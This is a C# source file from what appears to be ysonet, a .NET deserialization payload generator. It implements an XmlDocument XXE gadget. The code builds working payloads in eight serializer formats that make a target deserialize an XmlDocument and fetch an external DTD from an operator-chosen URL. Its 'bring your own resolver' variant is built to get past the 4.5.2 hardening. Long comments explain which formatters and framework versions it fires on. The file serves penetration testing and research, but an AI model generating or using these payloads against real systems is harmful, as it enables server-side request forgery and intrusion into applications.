using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * XmlDocumentXxe: makes a target that rebuilds a System.Xml.XmlDocument parse an XML
     * document the operator wrote, with a reader that still resolves external entities.
     *
     * THE SINK IS A PROPERTY SETTER, and it is one line of System.Xml:
     *
     *   XmlDocument.InnerXml            set { LoadXml(value); }
     *   XmlDocument.LoadXml(string)     SetupReader(new XmlTextReader(new StringReader(xml), NameTable))
     *
     * So assigning one string parses it. The DOCTYPE is read while the reader moves to the
     * first content node, which is why a document that is not otherwise meaningful still
     * fetches whatever its external parameter entity names.
     *
     * WHICH RESOLVER THAT READER GETS IS THE WHOLE GADGET, and SetupReader decides it:
     *
     *   private XmlTextReader SetupReader(XmlTextReader tr)
     *   {
     *       tr.XmlValidatingReaderCompatibilityMode = true;
     *       tr.EntityHandling = EntityHandling.ExpandCharEntities;
     *       if (HasSetResolver) { tr.XmlResolver = GetResolver(); }   // the document's own
     *       return tr;
     *   }
     *
     * HasSetResolver is false on a fresh XmlDocument, so the reader keeps ITS OWN default,
     * which XmlTextReaderImpl takes from XmlReaderSettings.EnableLegacyXmlSettings():
     *
     *   legacy   -> new XmlUrlResolver()   -> the external subset is fetched
     *   hardened -> null                   -> nothing is fetched
     *
     * THAT IS WHY THERE ARE TWO VARIANTS, and they are not the same reach.
     *
     *   variant 1 (legacy, default)  writes InnerXml and nothing else. It fires only where
     *                                the legacy default is in force: an application built
     *                                against below .NET Framework 4.5.2 (the switch reads the
     *                                ENTRY assembly's TargetFrameworkAttribute, so a fully
     *                                patched machine still fires it), a machine with the
     *                                EnableLegacyXmlSettings switch turned back on, or an
     *                                application that declares NO target framework moniker at
     *                                all - BinaryCompatibility turns a null or unparseable
     *                                moniker into TargetFrameworkId.Unspecified and applies no
     *                                quirks, and an ASP.NET app (non-default AppDomain, so no
     *                                entry-assembly fallback) with no
     *                                <httpRuntime targetFramework> gets exactly that. Declared
     *                                target span 4.0 - 4.5.1, exactly like DataViewManagerXxe
     *                                and DataSetXxe; the other two routes are not versions and
     *                                stay in AdditionalInfo().
     *   variant 2 (resolver)         assigns a real System.Xml.XmlUrlResolver to
     *                                XmlDocument.XmlResolver FIRST and InnerXml second. That
     *                                makes HasSetResolver true, so SetupReader installs the
     *                                payload's own resolver and EnableLegacyXmlSettings() is
     *                                never consulted. No version gate at all - it fires on a
     *                                current build against a current application.
     *
     * MEMBER ORDER IS THE VARIANT 2 PAYLOAD. Assigning InnerXml first would parse the
     * document before the resolver exists, so every variant 2 template below writes
     * XmlResolver before InnerXml, and the fire matrix proves the order per formatter by
     * requiring the request to arrive on a HARDENED build.
     *
     * A NULL RESOLVER IS NOT "NO RESOLVER", which is the trap that decides variant 1's
     * surrogate shapes. The XmlResolver setter sets bSetResolver = true even for null, so a
     * payload that merely MENTIONS the member with a null value turns the legacy default OFF
     * and variant 1 silently fetches nothing. That is why variant 1 uses its own surrogate
     * type with a single InnerXml property (see InnerXmlOnlySurrogate) instead of reusing
     * variant 2's, whose XmlResolver property would be written as null.
     *
     * HOW THIS DIFFERS FROM THE OTHER XXE GADGETS IN THIS CATALOG:
     *
     *   DataViewManagerXxe    property setter on System.Data.DataViewManager. Same formatter
     *                         FAMILY, but that carrier implements IList, which costs it
     *                         YamlDotNet and the MessagePack pair; and it has no way to
     *                         install a resolver, so it is legacy-only.
     *   DataSetXxe            the ISerializable CONSTRUCTOR of System.Data.DataSet, so the
     *                         opposite formatter family (BinaryFormatter and friends).
     *   XmlDocumentSurrogateXxe  reaches this very setter, but from an IObjectReference
     *                         carrier, so it covers the runtime and DataContract formatters
     *                         this gadget cannot reach - and it cannot install a resolver,
     *                         because it constructs the XmlDocument itself.
     *
     * The carrier here needs only System.Xml, which every target has.
     *
     * WHERE VARIANT 2 COMES FROM. Netwrix published the resolver-substitution form of this
     * chain for MessagePack Typeless (docs/references.md), including the reason it is worth
     * having: it turns a pre-4.5.2-only bug into one that lands on a current target. Their
     * write-up also records the target-side library limit repeated in the option help -
     * MessagePack-CSharp before 2.3.75 calls every setter on a type it builds, and
     * XmlNode.Value throws whatever it is given, so the read dies before the parse.
     *
     * LOCAL SAFETY. The generator never constructs a real XmlDocument: the two hand written
     * documents name the type as text, and the binary formats serialize an inert surrogate
     * whose type name is swapped afterwards. Nothing in -c is opened, resolved or contacted
     * while building. -t is ALLOWED and behaves like the other network gadgets: it
     * deserializes the payload here, so THIS machine performs the fetch. On variant 1 that
     * normally fetches nothing, because ysonet.exe targets 4.7.2 and so gets the hardened
     * default - the gadget says so on stderr. Variant 2 really does fetch on -t, because it
     * brings its own resolver.
     */
    public class XmlDocumentXxeGenerator : GenericGenerator
    {
        // Public so the tests can name the exact type and member instead of repeating them.
        public const string XmlDocumentClrName = "System.Xml.XmlDocument";
        public const string XmlUrlResolverClrName = "System.Xml.XmlUrlResolver";
        public const string SystemXmlAssemblyName =
            "System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        // The two members the payload writes, by the names the serializers look them up under.
        public const string InnerXmlMemberName = "InnerXml";
        public const string XmlResolverMemberName = "XmlResolver";

        public const int VariantLegacyDefault = 1;
        public const int VariantOwnResolver = 2;

        // Canonical long option names, so the generator, its help and the tests cannot drift.
        public const string VariantOptionName = "variant";
        public const string RawInputOptionName = "rawinput";

        // Shown in the empty-input refusal and in the option help.
        public const string ExampleUrl = "http://127.0.0.1:8080/x.dtd";

        private int variantNumber = VariantLegacyDefault;
        private bool rawInput;

        // ---- Metadata ----------------------------------------------------------

        // The proven effect is one outbound request made by the target, so the kind is
        // network. Information disclosure is deliberately NOT declared: fetching an external
        // DTD proves SSRF, and nothing in this chain returns file content to the sender.
        //
        // The versions on the gadget describe variant 1, the default: the deciding number is
        // the framework the target APPLICATION was BUILT against, because
        // XmlReaderSettings.EnableLegacyXmlSettings() reads the entry assembly's
        // TargetFrameworkAttribute once per process. Below 4.5.2 the legacy XmlTextReader gets
        // a real XmlUrlResolver; 4.5.2 and above gets null. Hence 4.0 to 4.5.1, the same span
        // and the same reasoning as DataViewManagerXxe and DataSetXxe. Variant 2 overrides
        // this with a wider span, because it installs its own resolver and that switch never
        // gets a say. The machine-wide EnableLegacyXmlSettings switch is the other way into
        // variant 1, is not a version, and stays in AdditionalInfo().
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx451))
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
        }

        // "Friday the 13th: JSON Attacks" (Black Hat USA / DEF CON 25, 2017) published the
        // XXE-setter technique class and names this exact carrier and member:
        // "System.Xml.XmlDocument/XmlDataDocument (.NET < 4.5.2) - set_InnerXml".
        public override string Finders()
        {
            return "Oleksandr Mirosh, Alvaro Munoz";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Two short sentences: this is the FIRST block of the interactive info panel and a
        // long one pushes the formatter, command-input and category lines off the screen. The
        // mechanics live in the header comment and the option help.
        public override string AdditionalInfo()
        {
            return "Sets XmlDocument.InnerXml, so the target parses your XML and fetches an external DTD. "
                + "Variant 1 needs a target app on pre-4.5.2 XML resolver defaults, a machine with the "
                + "EnableLegacyXmlSettings switch back on, or an app that declares NO target framework "
                + "moniker at all - an ASP.NET app with no <httpRuntime targetFramework> is legacy even on "
                + "a fully patched 4.8.1 machine. Variant 2 also sets XmlDocument.XmlResolver, which "
                + "removes that gate entirely.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and names a framework type of its own. It
            // reuses no other gadget and no other gadget reuses it.
            return new List<string> { GadgetTags.Independent };
        }

        // Every formatter here assigns a PUBLIC PROPERTY BY NAME on a type it constructs, which
        // is the whole requirement for variant 1 and half of it for variant 2.
        //
        // MEASURED, not assumed. Each cell below was settled by deserializing a hand written
        // document carrying a benign "<probe/>" and requiring the result to be an XmlDocument
        // whose DocumentElement is named "probe" - which can only be true if LoadXml ran.
        //
        // WHAT IS OUT, and why none of it is unexplored:
        //   BinaryFormatter, SoapFormatter, LosFormatter, FsPickler - XmlDocument is not
        //     [Serializable], so ObjectReader's CheckSerializable rejects it before it creates
        //     anything and FsPickler refuses the type during pickler resolution.
        //   Json.NET - XmlNode implements IEnumerable, so DefaultContractResolver builds an
        //     ARRAY contract: "Cannot deserialize the current JSON object ... because the type
        //     requires a JSON array". A JSON object can never reach the member.
        //   DataContractSerializer, NetDataContractSerializer, DataContractJsonSerializer,
        //     XmlSerializer - same IEnumerable fact from the other side: they build a contract
        //     from read-write members, and an IEnumerable type with no Add method has none.
        //
        // The "(2)" suffix is a display-only annotation meaning "this formatter carries 2
        // variants". FastJson and YamlDotNet carry variant 1 only, for the two reasons in
        // Variants() below.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.Xaml + " (2)",
                Formatters.JavaScriptSerializer + " (2)",
                Formatters.FastJson,
                "YamlDotNet < 5.0.0",
                Formatters.SharpSerializerXml + " (2)",
                Formatters.SharpSerializerBinary + " (2)",
                Formatters.MessagePackTypeless + " (2)",
                Formatters.MessagePackTypelessLz4 + " (2)",
            };
        }

        // -c is a URL the TARGET fetches. Nothing is resolved or contacted while building.
        // Both variants take the same thing; what changes is whether the target needs the
        // legacy resolver default to act on it.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                // Variant 1 inherits the gadget's facets (a null override means "same").
                new GadgetVariant(VariantLegacyDefault,
                    "Rely on the target's legacy XML defaults: set InnerXml only (pre-4.5.2 apps, default)"),

                // Variant 2 overrides the WHOLE facet set, which is why the kinds and the
                // requirements are repeated alongside the wider span: bringing its own
                // resolver removes the EnableLegacyXmlSettings gate entirely, so the version
                // axis is the ordinary "what did it fire on" one rather than a target-app
                // stamp. Measured at both ends - a 4.5.1-stamped child and a current 4.8.1
                // in-process run - and nothing between them reads a version.
                //
                // Two formatters cannot build the nested resolver and are refused by name:
                //   FastJson    every nested-object shape tried (a "$types" index, an inline
                //               "$type", with and without a member of its own, and with the
                //               members in either order) dies with a NullReferenceException
                //               inside fastJSON while the same document without the resolver
                //               member works. It can name the carrier; it cannot fill an
                //               object-typed member of it.
                //   YamlDotNet  its deserializer inspects a type through a READABLE-properties
                //               inspector, and XmlDocument.XmlResolver is write-only, so it
                //               refuses with "Property 'XmlResolver' not found on type
                //               'System.Xml.XmlDocument'". Variant 1 is unaffected, because
                //               InnerXml has a getter as well.
                new GadgetVariant(VariantOwnResolver,
                        "Bring your own resolver: set XmlResolver to an XmlUrlResolver first, so any version fires")
                    .Without(Formatters.FastJson, Formatters.YamlDotNet)
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.Network)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481))
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)),
            };
        }

        public override OptionSet Options()
        {
            // Not RawInputOption(): that shared help says formatter-layer escaping is turned
            // off, which is NOT what happens here. The finished XML is always escaped for the
            // outer payload; --rawinput only skips the check on the URL itself.
            return new OptionSet
            {
                {
                    "var|" + VariantOptionName + "=",
                    "Which payload to build. Choices:\r\n"
                        + VariantLegacyDefault + " (default) - set InnerXml only. The target's own "
                        + "XmlTextReader default decides whether the DTD is fetched, so this fires "
                        + "against an application built below .NET Framework 4.5.2, or on a machine "
                        + "where the EnableLegacyXmlSettings switch was turned back on. Smallest "
                        + "payload, widest formatter list.\r\n"
                        + VariantOwnResolver + " - set XmlResolver to a real System.Xml.XmlUrlResolver "
                        + "BEFORE InnerXml. The document then uses YOUR resolver instead of the "
                        + "reader's default, so the 4.5.2 hardening does not apply and any target "
                        + "version fetches. Costs FastJson and YamlDotNet, which cannot fill that "
                        + "member. Both variants make the SAME request; they differ only in whether "
                        + "the target had to be on the old defaults.\r\n"
                        + "Variant " + VariantOwnResolver + " is the technique Netwrix published for "
                        + "MessagePack Typeless (see docs/references.md). One target-side caveat "
                        + "belongs with it: MessagePack-CSharp before 2.3.75 calls EVERY setter on a "
                        + "type it builds, and XmlNode.Value throws whatever you give it, so the read "
                        + "dies before the parse. That is a limit of the target's library version, not "
                        + "of the payload, and it applies to both variants on those two formatters.",
                    v => int.TryParse(v, out variantNumber)
                },
                {
                    RawInputOptionName,
                    "Skip the URL validation and put -c into the DTD external identifier exactly "
                        + "as typed, with no trimming. Normal mode accepts an absolute http or "
                        + "https URL and refuses whitespace, control characters and the "
                        + "characters \" < > \\, because the value goes inside a QUOTED DTD "
                        + "external identifier and those would corrupt or escape it. Use this "
                        + "only for research on a resolver that accepts something else; the "
                        + "network effect this gadget declares was proven with http(s). It does "
                        + "NOT turn off the outer formatter's escaping, so the payload is still "
                        + "a valid document - but nothing checks that the identifier inside it "
                        + "still is, and a broken one simply fetches nothing.",
                    v => { if (v != null) rawInput = true; }
                },
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            if (variantNumber != VariantLegacyDefault && variantNumber != VariantOwnResolver)
                throw new ArgumentException(Name() + " has no variant " + variantNumber
                    + ". Use --" + VariantOptionName + " " + VariantLegacyDefault
                    + " (rely on the target's legacy XML defaults) or --" + VariantOptionName
                    + " " + VariantOwnResolver + " (bring your own XmlUrlResolver).");

            GuardVariantFormatter(variantNumber, formatter);

            string url = rawInput
                ? DtdSystemLiteral.RequireRawValue(inputArgs == null ? null : inputArgs.Cmd, Name())
                : DtdSystemLiteral.ValidateHttpUrl(inputArgs == null ? null : inputArgs.Cmd, Name(), ExampleUrl);

            object payload = FinishHandWrittenPayload(BuildPayload(XxeXml(url), formatter), formatter, inputArgs);

            ExplainSelfTest(inputArgs);
            return payload;
        }

        // On variant 1 with -t and no request, it is almost always because THIS ysonet build
        // (4.7.2) hands its XmlTextReader a null resolver, so the fetch the payload asks for
        // had nothing to resolve with. That is the correct result, not a broken payload.
        // Variant 2 gets no note: it brings its own resolver, so it really does fetch here.
        private void ExplainSelfTest(InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test || variantNumber != VariantLegacyDefault)
                return;

            string note = Helpers.Core.LegacyXmlDefaults.SelfTestCannotFetchNote(Name());
            if (note != null)
                Console.Error.WriteLine(note + " Variant " + VariantOwnResolver
                    + " fetches on any build, including this one.");
        }

        // The two spellings of the carrier names: the assembly qualified form the JSON-family
        // serializers and the two type swaps need, and the space-free form the hand written
        // SharpSerializer XML and YamlDotNet documents use.
        private const string XmlDocumentAssemblyQualifiedName =
            XmlDocumentClrName + ", " + SystemXmlAssemblyName;
        private const string XmlDocumentShortName =
            XmlDocumentClrName + ",System.Xml,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";
        private const string XmlUrlResolverAssemblyQualifiedName =
            XmlUrlResolverClrName + ", " + SystemXmlAssemblyName;
        private const string XmlUrlResolverShortName =
            XmlUrlResolverClrName + ",System.Xml,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";

        /// <summary>
        /// The XML the InnerXml setter parses. LoadXml builds an XmlTextReader over this
        /// string and reads it, which parses the DOCTYPE before anything else, so the external
        /// parameter entity is fetched first.
        ///
        /// %remote; is REFERENCED as well as declared: a parameter entity that is only declared
        /// is never resolved, so the reference is what forces the fetch.
        ///
        /// The DOCTYPE name matches the root element so the document is well formed. The name
        /// itself is arbitrary - unlike DataViewManagerXxe, nothing on the target compares it.
        /// </summary>
        internal static string XxeXml(string dtdUrl)
        {
            return "<!DOCTYPE xd ["
                 + "<!ENTITY % remote SYSTEM \"" + dtdUrl + "\">"
                 + "%remote;"
                 + "]><xd/>";
        }

        private object BuildPayload(string xml, string formatter)
        {
            bool ownResolver = variantNumber == VariantOwnResolver;

            if (IsFormatter(formatter, Formatters.Xaml))
                return XamlPayload(xml, ownResolver);

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
                return JavaScriptSerializerPayload(xml, ownResolver);

            if (IsFormatter(formatter, Formatters.FastJson))
                return FastJsonPayload(xml);

            if (IsFormatter(formatter, Formatters.YamlDotNet))
                return YamlDotNetPayload(xml);

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
                return SharpSerializerXmlPayload(xml, ownResolver);

            if (IsFormatter(formatter, Formatters.SharpSerializerBinary))
                return SharpSerializerBinaryPayload(xml, ownResolver);

            if (IsMessagePackTypeless(formatter))
                return MessagePackTypelessPayload(xml, ownResolver, IsMessagePackLz4(formatter));

            throw UnsupportedFormatter(formatter);
        }

        // XamlObjectWriter emits a type's ATTRIBUTE members before its property ELEMENTS, so
        // variant 2 cannot put InnerXml in an attribute: it would be assigned before the
        // resolver. Both members therefore travel as property elements there, in the order
        // they have to be applied.
        //
        // EscapeForXmlAttribute is used for the element text too. It escapes a double quote as
        // &#x22;, which element content does not require but which parses back to exactly the
        // same string, so one escaper covers both shapes without risking an under-escaped
        // attribute.
        private string XamlPayload(string xml, bool ownResolver)
        {
            string escaped = EscapeForXmlAttribute(xml, rawInput);

            if (!ownResolver)
                return @"<XmlDocument InnerXml=""" + escaped + @""" xmlns=""clr-namespace:System.Xml;assembly=System.Xml"" />";

            return @"<XmlDocument xmlns=""clr-namespace:System.Xml;assembly=System.Xml"">
  <XmlDocument.XmlResolver>
    <XmlUrlResolver />
  </XmlDocument.XmlResolver>
  <XmlDocument.InnerXml>" + escaped + @"</XmlDocument.InnerXml>
</XmlDocument>";
        }

        // Both JSON templates here quote with DOUBLE quotes, so they escape with
        // EscapeForJsonDoubleQuoted. EscapeForJson would also write an
        // apostrophe as \', which is not a legal JSON escape: fastJSON DROPS the character and
        // the URL would reach the target with the apostrophe missing.
        //
        // JavaScriptSerializer walks the parsed dictionary in the order the document lists its
        // keys, so XmlResolver is written first for variant 2.
        private string JavaScriptSerializerPayload(string xml, bool ownResolver)
        {
            string resolver = ownResolver
                ? @"
    """ + XmlResolverMemberName + @""":{""__type"":""" + XmlUrlResolverAssemblyQualifiedName + @"""},"
                : "";

            return @"
{
    ""__type"":""" + XmlDocumentAssemblyQualifiedName + @"""," + resolver + @"
    """ + InnerXmlMemberName + @""":""" + EscapeForJsonDoubleQuoted(xml, rawInput) + @"""
}";
        }

        // Variant 1 only (see Variants()): fastJSON can name the carrier and fill InnerXml, but
        // every nested-object shape for the XmlResolver member fails inside the library.
        private string FastJsonPayload(string xml)
        {
            return @"
{
    ""$types"":{
        """ + XmlDocumentAssemblyQualifiedName + @""":""1""
    },
    ""$type"":""1"",
    """ + InnerXmlMemberName + @""":""" + EscapeForJsonDoubleQuoted(xml, rawInput) + @"""
}";
        }

        // Variant 1 only (see Variants()): YamlDotNet's readable-properties inspector cannot
        // see the write-only XmlResolver member. The "!<!AssemblyQualifiedName>" tag is how
        // YamlDotNet < 5 resolves a mapping to a real type, and the scalar is double quoted, so
        // it takes the double-quoted escaper for the same reason as the JSON templates above.
        private string YamlDotNetPayload(string xml)
        {
            return @"
!<!" + XmlDocumentShortName + @"> {
    " + InnerXmlMemberName + @": """ + EscapeForJsonDoubleQuoted(xml, rawInput) + @"""
}";
        }

        // SharpSerializer's XML document names each type in an attribute, so it can be hand
        // written. Its deserializer assigns properties in document order, which is what makes
        // the variant 2 shape work: the nested Complex comes before the Simple.
        private string SharpSerializerXmlPayload(string xml, bool ownResolver)
        {
            string resolver = ownResolver
                ? @"
        <Complex name=""" + XmlResolverMemberName + @""" type=""" + XmlUrlResolverShortName + @""">
            <Properties />
        </Complex>"
                : "";

            return @"
<Complex type=""" + XmlDocumentShortName + @""">
    <Properties>" + resolver + @"
        <Simple name=""" + InnerXmlMemberName + @""" value=""" + EscapeForXmlAttribute(xml, rawInput) + @"""/>
    </Properties>
</Complex>";
        }

        // No document to hand write on the binary side, and constructing the real XmlDocument
        // would fire the payload inside ysonet, so serialize the surrogate below and swap the
        // type names in the stream. Variant 2 needs two swaps, because SharpSerializer writes
        // the nested resolver under its own name too.
        private byte[] SharpSerializerBinaryPayload(string xml, bool ownResolver)
        {
            if (!ownResolver)
                return SharpSerializerTypeSwap.SerializeAs(
                    new InnerXmlOnlySurrogate { InnerXml = xml },
                    XmlDocumentAssemblyQualifiedName);

            return SharpSerializerTypeSwap.SerializeAs(
                new ResolverThenInnerXmlSurrogate
                {
                    XmlResolver = new XmlUrlResolverSurrogate(),
                    InnerXml = xml
                },
                TargetTypeNames());
        }

        // MessagePack Typeless writes a type name wherever the member's static type is object,
        // which is why the variant 2 surrogate declares XmlResolver as object: that is what
        // makes the swapped XmlUrlResolver name travel with the payload.
        private byte[] MessagePackTypelessPayload(string xml, bool ownResolver, bool useLz4)
        {
            if (!ownResolver)
                return MessagePackTypelessTypeSwap.SerializeAs(
                    new InnerXmlOnlySurrogate { InnerXml = xml },
                    XmlDocumentAssemblyQualifiedName,
                    useLz4);

            return MessagePackTypelessTypeSwap.SerializeAs(
                new ResolverThenInnerXmlSurrogate
                {
                    XmlResolver = new XmlUrlResolverSurrogate(),
                    InnerXml = xml
                },
                TargetTypeNames(),
                useLz4);
        }

        // The two names both binary formats have to end up carrying for variant 2.
        private static IDictionary<Type, string> TargetTypeNames()
        {
            var map = new Dictionary<Type, string>();
            map.Add(typeof(ResolverThenInnerXmlSurrogate), XmlDocumentAssemblyQualifiedName);
            map.Add(typeof(XmlUrlResolverSurrogate), XmlUrlResolverAssemblyQualifiedName);
            return map;
        }

        // ---- Surrogate shapes --------------------------------------------------
        //
        // Shape only: the PROPERTY NAMES and their ORDER are what the binary serializers write
        // into the stream, and the type names are rewritten to the framework ones before the
        // payload leaves ysonet. None of these is ever deserialized as itself.

        /// <summary>
        /// Variant 1's carrier shape. It deliberately has NO XmlResolver property: the real
        /// XmlDocument.XmlResolver setter sets its bSetResolver flag even when the value is
        /// null, so a payload that merely names the member with a null value makes SetupReader
        /// install a null resolver and the legacy default this variant depends on is lost. The
        /// payload then deserializes cleanly and fetches nothing, which looks exactly like the
        /// technique not working.
        /// </summary>
        internal sealed class InnerXmlOnlySurrogate
        {
            public string InnerXml { get; set; }
        }

        /// <summary>
        /// Variant 2's carrier shape. XmlResolver is declared FIRST because both binary
        /// serializers write the members in declaration order and assign them in stream order,
        /// and the resolver has to be in place before InnerXml is parsed. It is typed object
        /// so MessagePack Typeless writes the nested type name.
        /// </summary>
        internal sealed class ResolverThenInnerXmlSurrogate
        {
            public object XmlResolver { get; set; }
            public string InnerXml { get; set; }
        }

        /// <summary>
        /// Stands in for System.Xml.XmlUrlResolver, which carries no payload of its own: the
        /// target only has to construct one, because merely having a resolver is what turns the
        /// external entity back on. Empty on purpose.
        /// </summary>
        internal sealed class XmlUrlResolverSurrogate
        {
        }

        // The URL check lives in Helpers/Input/DtdSystemLiteral, because it is mechanics shared
        // with the other external-DTD gadgets and names no gadget of its own. What stays here
        // is the payload: the DOCTYPE template and the documents above.
    }
}
